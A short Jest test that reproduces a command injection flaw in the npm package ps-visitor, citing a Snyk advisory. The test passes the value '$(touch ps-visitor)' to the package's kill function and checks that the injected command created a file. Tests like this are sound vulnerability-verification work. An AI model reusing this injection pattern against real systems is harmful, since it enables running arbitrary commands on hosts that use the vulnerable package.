//https://snyk.io/vuln/SNYK-JS-PSVISITOR-1078544
test("Command Injection in ps-visitor", () => {
  expect.assertions(2);
  const ps_visitor = require("ps-visitor");
  const fs = require("fs");
  const path = "./ps-visitor";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps_visitor.kill("$(touch ps-visitor)").catch(() => {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
